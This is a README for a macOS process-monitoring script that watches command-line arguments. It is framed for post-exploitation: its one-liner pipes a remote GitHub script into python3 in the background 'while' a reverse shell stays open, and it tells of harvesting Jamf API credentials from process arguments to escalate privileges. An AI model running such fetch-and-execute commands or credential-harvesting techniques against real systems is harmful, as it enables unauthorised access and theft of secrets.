# pview
Monitor New Processes Created On MacOS, Similar to https://github.com/DominicBreuker/pspy, and https://objective-see.com/products/utilities.html#ProcessMonitor. No Dependencies Required.

## This is it
```
nohup bash -c "curl  https://raw.githubusercontent.com/latortuga71/pview/main/pview.py | python3 > /tmp/procs.txt" &
keep your reverse shell while its running.
```

## Why
Needed to monitor jamf scripts commandline arguments on mac recently, jamf api keys were being used in jamf scripts that ran peroidically. Using process monitor gathered curl args and got creds which allowed full access to jamf server. Allowing privesc. 
## BUT 
ProcessMonitor requires root access and pspy doesnt work on mac due to no /proc directory. also ps cannot really be rewritten as it wont show root processes. So this python script uses ps in a loop to gather processes since ps has SUID bit set by defalt and can see all processes.

## NOTE
it wont capture everything it will miss processes that end quickly due to the nature of how it loops.
